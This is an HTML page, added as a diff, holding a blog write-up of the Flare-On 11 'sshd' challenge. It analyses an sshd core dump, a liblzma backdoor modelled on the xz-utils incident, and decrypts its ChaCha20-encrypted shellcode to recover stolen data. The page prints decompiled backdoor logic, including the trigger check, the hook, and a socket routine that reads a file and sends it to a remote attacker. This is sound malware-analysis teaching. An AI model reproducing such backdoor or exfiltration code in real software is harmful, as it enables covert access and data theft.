@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>sshd (extended writeup) | 🍠 yamsbot</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+Description
+sshd was the 5th challenge in this years flare-on competition, Flare-On 11
+i am writing this after the competition, and the challenge descriptions are no longer available, but tthe official description was along the lines of:
+&ldquo;some hackers broke into our server and stole some data&hellip; they crashed our server&hellip; blah blah blah find the data&rdquo;
+competitors are given the &ldquo;full&rdquo; file system dump of the server that was compromised">
+<meta name="author" content="">
+<link rel="canonical" href="https://yams.bot/writeups/flareon2024/sshd/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://yams.bot/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://yams.bot/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://yams.bot/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://yams.bot/apple-touch-icon.png">
+<link rel="mask-icon" href="https://yams.bot/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://yams.bot/writeups/flareon2024/sshd/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://yams.bot/writeups/flareon2024/sshd/">
+  <meta property="og:site_name" content="🍠 yamsbot">
+  <meta property="og:title" content="sshd (extended writeup)">
+  <meta property="og:description" content=" Description sshd was the 5th challenge in this years flare-on competition, Flare-On 11
+i am writing this after the competition, and the challenge descriptions are no longer available, but tthe official description was along the lines of:
+“some hackers broke into our server and stole some data… they crashed our server… blah blah blah find the data”
+competitors are given the “full” file system dump of the server that was compromised">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-11-13T00:00:48-05:00">
+    <meta property="article:modified_time" content="2024-11-13T00:00:48-05:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sshd (extended writeup)">
+<meta name="twitter:description" content="
+Description
+sshd was the 5th challenge in this years flare-on competition, Flare-On 11
+i am writing this after the competition, and the challenge descriptions are no longer available, but tthe official description was along the lines of:
+&ldquo;some hackers broke into our server and stole some data&hellip; they crashed our server&hellip; blah blah blah find the data&rdquo;
+competitors are given the &ldquo;full&rdquo; file system dump of the server that was compromised">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "writeups",
+      "item": "https://yams.bot/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Flare-On 2024",
+      "item": "https://yams.bot/writeups/flareon2024/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "sshd (extended writeup)",
+      "item": "https://yams.bot/writeups/flareon2024/sshd/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "sshd (extended writeup)",
+  "name": "sshd (extended writeup)",
+  "description": " Description sshd was the 5th challenge in this years flare-on competition, Flare-On 11\ni am writing this after the competition, and the challenge descriptions are no longer available, but tthe official description was along the lines of:\n\u0026ldquo;some hackers broke into our server and stole some data\u0026hellip; they crashed our server\u0026hellip; blah blah blah find the data\u0026rdquo;\ncompetitors are given the \u0026ldquo;full\u0026rdquo; file system dump of the server that was compromised\n",
+  "keywords": [
+    
+  ],
+  "articleBody": " Description sshd was the 5th challenge in this years flare-on competition, Flare-On 11\ni am writing this after the competition, and the challenge descriptions are no longer available, but tthe official description was along the lines of:\n“some hackers broke into our server and stole some data… they crashed our server… blah blah blah find the data”\ncompetitors are given the “full” file system dump of the server that was compromised\nWriteup analyzing the file system, we eventually come across an ssh core dump.\n/var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676\ngiven the title of the challenge “sshd”, and the challenge description, this core dump is more than likely exactly what we are looking for.\nthe best way to analyze the core dump is by the use of gdb. from the root of the file system dump we can execute:\ngdb usr/sbin/sshd var/lib/systemd/coredump/sshd.core.93794.0.0.11.172591767\nthis loads the coredump and specifies sshd as the target process\nsince we are not using the provided system dump as a docker image (intended way), lets go ahead and set the sysroot to the dumped file system so all libs are imported correctly\nset sysroot .\nCoredump since we are analyzing a core dump, the first gdb command to run is bt, short for backtrace by definition, backtrace “Prints backtrace of all stack frames, or innermost COUNT frames.”\nanalyzing the stack frames allows us to determine where and why the program crashed, reversing through the stack to determine exactly what was executed.\nwhat immediately pops out to me is liblzma.so.5, think back a couple of months, depending on when you are reading this, a couple years even. a developer at microsoft discovered a backdoor in xz-utils liblzma that would have allowed unrestricted access to any device running openssh. if you dont remember this, simple looking up “liblzma ssh” on google will yield fruitful results. if you are lazy, here is a recap of the vulnerability coined CVE-2024-3094.\nanyways, continuing with the analysis we run\nframe 1 to load the last frame before null dereference info reg to take a peak at the registers at the time of the crash\ncurrently the registers dont mean much to us without having debugged the coredump, but it is good to take a peak at them beforehand, especially the current rip value.\nfollowing some enumeration of the stack frame i find that the crash occurs @ 0x7f4a18c8f88d, a call to $rax. $rax being zeroed out in this case:\nto get a bigger picture, lets find the start of the function and see what was performed. we endbr64 @ 0x7f4a18c8f820 signifying the start of the function\n(gdb) x/32i 0x7f4a18c8f820\n0x7f4a18c8f855: xor eax,eax 0x7f4a18c8f857: call 0x7f4a18c8a830 \u003cgetuid@plt\u003e 0x7f4a18c8f85c: lea rsi,[rip+0x19f79] # 0x7f4a18ca97dc 0x7f4a18c8f863: test eax,eax 0x7f4a18c8f865: jne 0x7f4a18c8f877 0x7f4a18c8f867: cmp DWORD PTR [rbp+0x0],0xc5407a48 0x7f4a18c8f86e: je 0x7f4a18c8f8c0 0x7f4a18c8f870: lea rsi,[rip+0x19f51] # 0x7f4a18ca97c8 0x7f4a18c8f877: xor edi,edi 0x7f4a18c8f879: call 0x7f4a18c8acf0 \u003cdlsym@plt\u003e keeping in mind the calling convention for dlsym:\nvoid *dlsym(void *restrict handle, const char *restrict symbol); checking out the potential symbols loaded into rsi:\nthis loosely translates into the following psuedo-c:\nint uid; char symbol[] = \"RSA_public_decrypt\" uid = getuid(void); if (uid == 0) { if (unknown == 0xc5407a48) { unknown_func(); } symbol = \"RSA_public_decrypt \"; } dlsym(0, symbol); there are two posibilities, if the user id of the calling process is anything other than 0, the address of symbol \"RSA_public_decrypt\" will be resolved. if the user id of the calling process IS root, the address of the symbol \"RSA_public_decrypt \" (added space at the end) will be resolved. admittedly i do not have much reversing experience with backdoors and malware, but this is a dead giveaway of malicious activity.\nthis seems to answer our first question of why did the program crash?:\nmy immediate assumption is that the malicious symbol was attempted to be resolved by dlysym, but was unable to be resolved leading to the null ptr call crashing the program\nwe still have this unknown function to account for that is called if the following condition is met:\ncmp DWORD PTR [rbp+0x0],0xc5407a48 checking the current value of $rbp:\n(gdb) x/x $rbp 0x55b46d51dde0: 0xc5407a48 in the case of this execution the condition was met, meaning this jump was taken.. lets look at the exexecuted block: (gdb) x/42i 0x7f4a18c8f8c0\nthere is a lot going on here, well not really. we can start by analyzing the bytes moved into registers from the stack, as well as the additional functions that are called. we dont find anything of interest in the first few instructions, but in the call to 0x7f4a18c8f3f0 we find a constant value that gives us a big hint as to what is going on:\nmovabs rdi,0x3320646e61707865 ... movabs rdi,0x6b20657479622d32 the absolute value that rdi is set to in both instances are constants used in the ChaCha20 stream cipher. analyzing the function further in ghidra confirms our theory. reviewing how the chacha20 stream cipher works, we reference the python3 cryptodome documentation for a quick overview.\nsparing you some time, stream ciphers work by generating the cipher stream given a key, in this case a key and nonce, then encrypts the data byte by byte using the stream cipher. stream ciphers are linear, meaning that the same key will both encrypt and decrypt the message.\nAnalyzing liblzma.so.5.4.1 based on the core dump we can confidently say something malicious is happening in the liblzma lib. to begin our analysis we will slap the .so into ghidra. we have some base strings to go off of, so we can simply Search--\u003eFor strings... and filter for “RSA_”\nonce we find our strings we can navigate to them and look at the references to the strings to find the relevant function\nbased on our previous discoveries:\nsus dynamic resolution chacha20 stream cipher we can clean up the decompilation a bit and do some guess work:\nLets go over this screenshot before moving further..\nCheck for UID 0 Check for param2 specific value, malicious trigger value Initialize ChaCha20 cipher Dynamically allocate some data for malicious function Decrypt bytes “\u0026malicious” Execute decrypted bytes Initialize ChaCha20 cipher Re-encrypt malicious bytes Dynamically resolve “RSA_public_decrypt \" armed with this information we should be able to find and decrypt the bytes that are executed\nDecrypting malicious function i am going to go into detail as much as possible without skipping any steps, if you are more experienced you can gloss over this, if not this may be good material to learn from.\nx86 calling convention is as follows:\nfunc($rdi,$rsi,$rdx,$rcx,$r8,$r9,the rest passed from stack..);\nrax is typically the return value from the previously called function\nfocusing on one piece at a time we will start with how much memory is allocated so we can determine the size of the malicious code\n0x7f4a18c8f8e7: xor r9d,r9d 0x7f4a18c8f8ea: mov ecx,0x22 0x7f4a18c8f8ef: xor edi,edi 0x7f4a18c8f8f1: movsxd rsi,DWORD PTR [rip+0x28a68] # 0x7f4a18cb8360 0x7f4a18c8f8f8: mov r8d,0xffffffff 0x7f4a18c8f8fe: mov edx,0x7 0x7f4a18c8f903: call 0x7f4a18c8a840 \u003cmmap@plt\u003e 0x7f4a18c8f908: movsxd rdx,DWORD PTR [rip+0x28a51] # 0x7f4a18cb8360 0x7f4a18c8f90f: lea rsi,[rip+0x1a04a] # 0x7f4a18ca9960 0x7f4a18c8f916: mov rdi,rax 0x7f4a18c8f919: call 0x7f4a18c8a9e0 \u003cmemcpy@plt\u003e mmap documentation\nmemcpy documentation\nvoid *mmap(void addr[.length], size_t length, int prot, int flags, int fd, off_t offset); void *memcpy(void dest[restrict .n], const void src[restrict .n], size_t n); lets reconstruct the call to mmap and memcpy ourselves, even though ghidra does it for us sometimes ghidra can be wrong, always good to double check:\ndest = mmap(0x0, 0x0f96, 0x7, 0x22, -1, 0); memcpy(dest, 0x7f4a18ca9960, 0x0f96); we know that a memory block of 0x0f96 is being allocated, after allocation a block of memory is copied into the newly allocated region. directly following the call to memcpy:\n0x7f4a18c8f91e: movsxd rdx,DWORD PTR [rip+0x28a3b] # 0x7f4a18cb8360 0x7f4a18c8f925: mov rdi,r15 0x7f4a18c8f928: mov rsi,rax 0x7f4a18c8f92b: mov QWORD PTR [rsp+0x8],rax 0x7f4a18c8f930: call 0x7f4a18c8f520 0x7f4a18c8f935: mov r8,QWORD PTR [rsp+0x8] 0x7f4a18c8f93a: xor eax,eax 0x7f4a18c8f93c: call r8 $rax is moved into rsi $rax, which holds the location of the malicious code is is moved onto the stack at $rsp+0x8 the ChaCha20 function is called, decrypting the function the function location is moved into $r8 $r8 is called armed with this information the final steps before decrypting the malicious function are determining the data used to initialize the ChaCha20 cipher\n0x7f4a18c8f8c0: lea r11,[rbp+0x24] 0x7f4a18c8f8c4: lea r10,[rbp+0x4] 0x7f4a18c8f8c8: xor ecx,ecx 0x7f4a18c8f8ca: lea r15,[rsp+0x20] 0x7f4a18c8f8cf: mov rdx,r11 0x7f4a18c8f8d2: mov rsi,r10 0x7f4a18c8f8d5: mov QWORD PTR [rsp+0x18],r11 0x7f4a18c8f8da: mov rdi,r15 0x7f4a18c8f8dd: mov QWORD PTR [rsp+0x10],r10 0x7f4a18c8f8e2: call 0x7f4a18c8f3f0 while it is unlikely that the stack values align perfectly, we are hopeful that the register values still hold true as these instructions were executed not long before the program crashed. our main focus in this case is $rdi, $rsi, $rdx\nwithin gdb lets execute info reg to check out the register values:\nrax 0x0 0 rbx 0x1 1 rcx 0x55b46d58e080 94233417015424 rdx 0x55b46d58eb20 94233417018144 rsi 0x55b46d51dde0 94233416556000 rdi 0x200 512 rbp 0x55b46d51dde0 0x55b46d51dde0 rsp 0x7ffcc6601ea0 0x7ffcc6601ea0 $rdi is set to an interesting int value of 512, while $rsi and $rdx are both set to addresses. reviewing them we see that $rdx is a zeroed out region, and $rsi contains what seems to be random bytes:\n(gdb) x/10gx $rsi 0x55b46d51dde0: 0x38f63d94c5407a48 0xa51863dee21318a8 0x55b46d51ddf0: 0x7b8abb2dbaa0f907 0x5ea6118dd06636a6 0x55b46d51de00: 0x9f8336f26fd614c9 0x552986521a71cd4d 0x55b46d51de10: 0x0dc2a7f9b7d15858 0x9605a3ea190ede36 0x55b46d51de20: 0x418f170db9b959da 0xdcb50715eb7e3d42 (gdb) x/10gx $rdx 0x55b46d58eb20: 0x0000000000000000 0x0000000000000000 0x55b46d58eb30: 0x0000000000000000 0x0000000000000000 0x55b46d58eb40: 0x0000000000000000 0x0000000000000000 0x55b46d58eb50: 0x0000000000000000 0x0000000000000000 0x55b46d58eb60: 0x0000000000000000 0x0000000000000000 examining the value at $rsi further, we see that it is 0x200 bytes in size lets dump this memory to a file for later use\n(gdb) dump memory rsi $rsi $rsi+512\nif you are unfamiliar with the command used reference (gdb) help dump memory :)\nlooking closely, we also notice this is the same data that was used to determine if the program should begin malicious execution or not 487a 40c5\nup until now we have been looking passed exactly what is actually happening to trigger this execution, like where did this data even come from?\nNavigating to the previous stack frame, frame #2 using (gdb) frame 2, we look at the execution trace and notice that the program is calling , which then triggers the conditional function we were looking at earlier in ghidra. This is where the backdoor actually begins working, when a client is authenticating to the server, the server calls the RSA public decrypt function from the PLT. in order for the malicious function to be called, there must have been some control flow tampering done such as manipulating the GOT or the PLT or applying a function hook to redirect/manipulate exexecution. if we refer to the man page for this function we can see the calling convention:\nint RSA_public_decrypt(int flen, unsigned char *from, unsigned char *to, RSA *rsa, int padding); referencing the stack trace we have:\n0x55b46c78679c: mov r9,QWORD PTR [rsp+0x8] 0x55b46c7867a1: mov rsi,QWORD PTR [rsp+0x18] 0x55b46c7867a6: mov rcx,rbx 0x55b46c7867a9: mov rdx,rax 0x55b46c7867ac: mov r8d,0x1 0x55b46c7867b2: mov r12d,0xffffffea 0x55b46c7867b8: mov edi,r9d 0x55b46c7867bb: call 0x55b46c6e62b0 \u003cRSA_public_decrypt@plt\u003e so the value that we are referencing in $rsi represents the data unsigned char *from in the real RSA_public_decrypt call.\nso far this malicious backdoor operates almost exactly as did the “real life” backdoor that was installed in xz-utils. one difference i will note is that this implementation of the backdoor is using the from value of the function rather than the *RSA struct.\nback to decrypting the shellcode.\nlooking at the instruction execution sequence before “ChaCha20_init”:\n0x7f4a18c8f8c0: lea r11,[rbp+0x24] 0x7f4a18c8f8c4: lea r10,[rbp+0x4] 0x7f4a18c8f8c8: xor ecx,ecx 0x7f4a18c8f8ca: lea r15,[rsp+0x20] 0x7f4a18c8f8cf: mov rdx,r11 0x7f4a18c8f8d2: mov rsi,r10 0x7f4a18c8f8d5: mov QWORD PTR [rsp+0x18],r11 0x7f4a18c8f8da: mov rdi,r15 0x7f4a18c8f8dd: mov QWORD PTR [rsp+0x10],r10 0x7f4a18c8f8e2: call 0x7f4a18c8f3f0 focus on:\nlea r11, [rbp+0x24] lea r10, [rbp+0x04] ... mov rdx, r11 mov rsi, r10 the data we have been examining in $rsi, $rbp also points to this data:\nrsi 0x55b46d51dde0 94233416556000 rbp 0x55b46d51dde0 0x55b46d51dde0 based on this we can assume that chacha20 is initialized as such:\ncipher = ChaCha20.new(key=[rbp+0x04], nonce=[rbp+0x36]) lets extract the encrypted payload so we can decrypt it!\n(gdb) dump memory encrypted 0x7f4a18ca9960 0x7f4a18ca9960+0x0f96\nfollowing the pycryptodome documentation for ChaCha20 we create the following decryptor:\ndecrypt.py\n#!/usr/bin/env python3 from base64 import b64decode from Crypto.Cipher import ChaCha20 with open(\"rsi\", \"rb\") as f: key_data = f.read() f.close() with open(\"encrypted\", \"rb\") as f: encrypted = f.read() f.close() cipher = ChaCha20.new(key=key_data[4:36], nonce=key_data[36:48]) decrypted = cipher.decrypt(encrypted) with open(\"decrypted\", \"wb\") as f: f.write(decrypted) f.close() print(\"[+] done\") unfortunately the decrypted data is not the flag, but, it is instead shellcode! lets disassemble and decompile it in ghidra. open the decrypted file in ghidra and specify the language as x86 64 gcc. ghidra wont automatically disassemble the program, so click on the first instruction and press “d”, this should disassemble the entire program in one go.\nthe program doesnt look very interesting at first glance, thats because the first function we see is just to call the main function\nvoid UndefinedFunction_00000000(void) { FUN_00000dc2(); return; } jump into FUN_00000dc2() and this is where the FUN begins haha get it ahem sorry\nFinding the stolen data (flag) the decompilation of the main function of the program is pretty ugly at first glance\nundefined8 FUN_00000dc2(undefined8 param_1,undefined8 param_2) { char cVar1; undefined4 uVar2; long lVar3; char *pcVar4; byte bVar6; undefined local_12a0 [32]; undefined local_1280 [61]; undefined uStack_1243; char local_1170 [4228]; int local_ec; char *pcVar5; bVar6 = 0; uVar2 = FUN_0000001a(param_1,param_2,0x539); syscall(); syscall(); syscall(); syscall(); uStack_1243 = 0; syscall(); syscall(); lVar3 = -1; pcVar5 = local_1170; do { pcVar4 = pcVar5; if (lVar3 == 0) break; lVar3 = lVar3 + -1; pcVar4 = pcVar5 + (ulong)bVar6 * -2 + 1; cVar1 = *pcVar5; pcVar5 = pcVar4; } while (cVar1 != '\\0'); local_ec = ~(uint)lVar3 - 1; FUN_00000cd2(pcVar4,local_1170,local_12a0,local_1280,0,0); FUN_00000d49(); syscall(); syscall(); FUN_0000000b(uVar2,local_1170,local_ec); FUN_0000008f(); return 0; } to clean this up we can navigate to the script manager in ghidra, filter for syscall and run the ResolveX86orX64LinuxSyscallsScript.java script.. (i had to edit the script to exclude the ELF header check)\nnow we have a much more clean looking shellcode decompilation:\nperforming further analysis on the decrypted shellcode, we gain an understanding on how the attackers interacted with the backdoor and how data was exfiltrated. in the “real world” xz-utils backdoor, the attackers specified what type of action they wanted to take against the infected system when they initiated the ssh connection. refer to the following article for a better explanation.\nin this case, the backdoor initiates a socket connection and executes recvfrom() to recieve commands from the remote attacker.\npaying attention the following snippet:\n__fd = init_socket(param_1,param_2,0x539); recvfrom(__fd,local_12a0,32,0,(sockaddr *)0x0,(socklen_t *)0x0); recvfrom(__fd,local_1280,12,0,(sockaddr *)0x0,(socklen_t *)0x0); recvfrom(__fd,\u0026local_f0,4,0,(sockaddr *)0x0,(socklen_t *)0x0); sVar2 = recvfrom(__fd,local_1270,(ulong)local_f0,0,(sockaddr *)0x0,(socklen_t *)0x0); local_1270[(int)sVar2] = '\\0'; __fd_00 = open(local_1270,0,0); read(__fd_00,local_1170,128); without diving too deep into whats happening, the first two sizes specified in recvfrom are 32 and 12, the same sizes of a key and nonce for the ChaCha20 stream cipher. the third call to recvfrom stores the result in \u0026local_f0, which is then used as a size for the following recvfrom call. this could be used to specify the size of the string they are going to pass in the next and final recvfrom call. the string in the 4th and final recvfrom call is terminated and passed to open, where 128 bytes are then read from the file.\nwith the large distance from $rsp, these values could very well still be present on the stack, lets go search for them in the coredump..\nSearching for c2 commands the stack is more than likely misalligned in its current state, but we can assume that the values will be relatively close to their original location due to the small amount of execution between the backdoor and the crash point.\n$rsp-0x1270 shows a partial string, and with some simple enumeration we find that the file exfiltrated is now located at $rsp-0x1288. this is great, as we can now determine where the exfiltrated data lies in memory and we know the file that was exfiltrated!\nEncryption of exfiltrated data now focusing on the next part of the malicious shellcode:\nFUN_00000cd2(pcVar4,local_1170,local_12a0,local_1280); FUN_00000d49(); sendto(__fd,local_ec,4,0,(sockaddr *)0x0,0); sendto(__fd,local_1170,(ulong)local_ec[0],0,(sockaddr *)0x0,0); this looks extremely similar to the ChaCha20 initialization that we saw earlier in the backdoor. we know that local_12a0 holds a value of 32 and local_1280 holds a value of 12. analyzing FUN_00000cd2() and the subfunctions called within reveal that it is indeed a form of encryption. reviewing the entire execution is out of scope for this writeup, but due to the following constant:\nwe can confidently say this is a ChaCha20 stream cipher encryption function. similar to how we saw in the first steps of the backdoor, the exfiltrated data is first encrypted with the key and nonce specified by the attacker, then send to the attacker using the sendto function calls over the socket.\nDecrypting exfiltrated data before we can decrypt the exfiltrated data we need to first find the data, the key and the nonce. referencing the following code:\nrecvfrom(__fd,local_12a0,32,0,(sockaddr *)0x0,(socklen_t *)0x0); recvfrom(__fd,local_1280,12,0,(sockaddr *)0x0,(socklen_t *)0x0); recvfrom(__fd,\u0026local_f0,4,0,(sockaddr *)0x0,(socklen_t *)0x0); sVar2 = recvfrom(__fd,local_1270,(ulong)local_f0,0,(sockaddr *)0x0,(socklen_t *)0x0); local_1270[(int)sVar2] = '\\0'; __fd_00 = open(local_1270,0,0); read(__fd_00,local_1170,128); we know that the locations on the stack will be offset by 0x18.\n(gdb) dump memory chacha20_key $rsp-0x12b8 $rsp-(0x12b8-32) (gdb) dump memory chacha20_nonce $rsp-0x1298 $rsp-(0x1298-12) (gdb) dump memory chacha20_data $rsp-0x1188 $rsp-(0x1188-128) modify our decrypt.py program:\n#!/usr/bin/env python3 from base64 import b64decode from Crypto.Cipher import ChaCha20 with open(\"chacha20_key\", \"rb\") as f: key = f.read() f.close() with open(\"chacha20_nonce\", \"rb\") as f: nonce = f.read() f.close() with open(\"chacha20_data\", \"rb\") as f: encrypted = f.read() f.close() cipher = ChaCha20.new(key=key, nonce=nonce) decrypted = cipher.decrypt(encrypted) with open(\"decrypted_flag\", \"wb\") as f: f.write(decrypted) f.close() print(\"[+] done\") and run it!\n$ cat decrypted_flag (E[]x|]^tR}A%NC;v 5q~1)m5mK\u003c밠 @vqU6sN)«\"lVJ*u_bC thats clearly not a flag. so what went wrong?\nsaving you from a headache, after careful enumeration of the encryption function we will notice that the constant used is:\nexpand 32-byte K\nwell, the constant used in ChaCha20 is:\nexpand 32-byte k (lower-case k)\nto overcome this we can use this chacha20 C implementation, modifying chacha20.c changing the magic constant from the lowecase k to uppercase K, then writing the following decrypt C program:\n#include \"chacha20.h\" #include #include int main() { int fd; int c; uint64_t counter; uint8_t key[32]; uint8_t nonce[12]; uint8_t data[128]; struct chacha20_context ctx; fd = open(\"chacha20_key\", O_RDONLY); c = read(fd, key, 32); close(fd); fd = open(\"chacha20_nonce\", O_RDONLY); c = read(fd, nonce, 12); close(fd); fd = open(\"chacha20_data\", O_RDONLY); c = read(fd, data, 128); close(fd); chacha20_init_context(\u0026ctx, key, nonce, counter); chacha20_xor(\u0026ctx, data, 128); c = write(1, data, 128); return 0; } compile the program with gcc\n$ gcc -o decrypt decrypt.c chacha20.c and get flag :)\nif you made it this far thanks for reading i hope you learned a thing or two. unfortunately this is as far as i made in Flare this year. out of the 5 challenges solved this was by far my favorite which is why i included it in my writeups. goodbye!\n",
+  "wordCount" : "3098",
+  "inLanguage": "en",
+  "datePublished": "2024-11-13T00:00:48-05:00",
+  "dateModified": "2024-11-13T00:00:48-05:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://yams.bot/writeups/flareon2024/sshd/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "🍠 yamsbot",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://yams.bot/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://yams.bot/" accesskey="h" title="🍠 yamsbot (Alt + H)">🍠 yamsbot</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://yams.bot/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://yams.bot/writeups/" title="writeups">
+                    <span>writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://yams.bot/research/" title="research">
+                    <span>research</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://yams.bot/random/" title="random">
+                    <span>random</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      sshd (extended writeup)
+    </h1>
+    <div class="post-meta"><span title='2024-11-13 00:00:48 -0500 EST'>November 13, 2024</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;3098 words
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#description" aria-label="Description">Description</a></li>
+                <li>
+                    <a href="#writeup" aria-label="Writeup">Writeup</a><ul>
+                        
+                <li>
+                    <a href="#coredump" aria-label="Coredump">Coredump</a></li>
+                <li>
+                    <a href="#analyzing-liblzmaso541" aria-label="Analyzing liblzma.so.5.4.1">Analyzing liblzma.so.5.4.1</a></li>
+                <li>
+                    <a href="#decrypting-malicious-function" aria-label="Decrypting malicious function">Decrypting malicious function</a></li>
+                <li>
+                    <a href="#finding-the-stolen-data-flag" aria-label="Finding the stolen data (flag)">Finding the stolen data (flag)</a><ul>
+                        
+                <li>
+                    <a href="#searching-for-c2-commands" aria-label="Searching for c2 commands">Searching for c2 commands</a></li>
+                <li>
+                    <a href="#encryption-of-exfiltrated-data" aria-label="Encryption of exfiltrated data">Encryption of exfiltrated data</a></li>
+                <li>
+                    <a href="#decrypting-exfiltrated-data" aria-label="Decrypting exfiltrated data">Decrypting exfiltrated data</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><hr>
+<h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<p>sshd was the 5th challenge in this years flare-on competition, Flare-On 11</p>
+<p>i am writing this after the competition, and the challenge descriptions are no longer available, but tthe official description was along the lines of:</p>
+<p>&ldquo;some hackers broke into our server and stole some data&hellip; they crashed our server&hellip; blah blah blah find the data&rdquo;</p>
+<p>competitors are given the &ldquo;full&rdquo; file system dump of the server that was compromised</p>
+<hr>
+<h2 id="writeup">Writeup<a hidden class="anchor" aria-hidden="true" href="#writeup">#</a></h2>
+<p>analyzing the file system, we eventually come across an ssh core dump.</p>
+<p><code>/var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676</code></p>
+<p>given the title of the challenge &ldquo;sshd&rdquo;, and the challenge description, this core dump is more than likely exactly what we are looking for.</p>
+<p>the best way to analyze the core dump is by the use of gdb. from the root of the file system dump we can execute:</p>
+<p><code>gdb usr/sbin/sshd var/lib/systemd/coredump/sshd.core.93794.0.0.11.172591767</code></p>
+<p>this loads the coredump and specifies sshd as the target process</p>
+<p>since we are not using the provided system dump as a docker image (intended way), lets go ahead and set the sysroot to the dumped file system so all libs are imported correctly</p>
+<p><code>set sysroot .</code></p>
+<hr>
+<h3 id="coredump">Coredump<a hidden class="anchor" aria-hidden="true" href="#coredump">#</a></h3>
+<p>since we are analyzing a core dump, the first gdb command to run is <code>bt</code>, short for <code>backtrace</code>
+by definition, backtrace &ldquo;Prints backtrace of all stack frames, or innermost COUNT frames.&rdquo;</p>
+<p>analyzing the stack frames allows us to determine where and why the program crashed, reversing through the stack to determine exactly what was executed.</p>
+<p><img loading="lazy" src="/images/flare2024/backtrace.png"></p>
+<p>what immediately pops out to me is <code>liblzma.so.5</code>, think back a couple of months, depending on when you are reading this, a couple years even. a developer at microsoft discovered a backdoor in xz-utils liblzma that would have allowed unrestricted access to any device running openssh. if you dont remember this, simple looking up &ldquo;liblzma ssh&rdquo; on google will yield fruitful results. if you are lazy, <a href="https://www.ssh.com/blog/a-recap-of-the-openssh-and-xz-liblzma-incident">here</a> is a recap of the vulnerability coined CVE-2024-3094.</p>
+<p>anyways, continuing with the analysis we run</p>
+<p><code>frame 1</code> to load the last frame before null dereference
+<code>info reg</code> to take a peak at the registers at the time of the crash</p>
+<p>currently the registers dont mean much to us without having debugged the coredump, but it is good to take a peak at them beforehand, especially the current rip value.</p>
+<p>following some enumeration of the stack frame i find that the crash occurs @ <code>0x7f4a18c8f88d</code>, a call to $rax. $rax being zeroed out in this case:</p>
+<p><img loading="lazy" src="/images/flare2024/crash.png"></p>
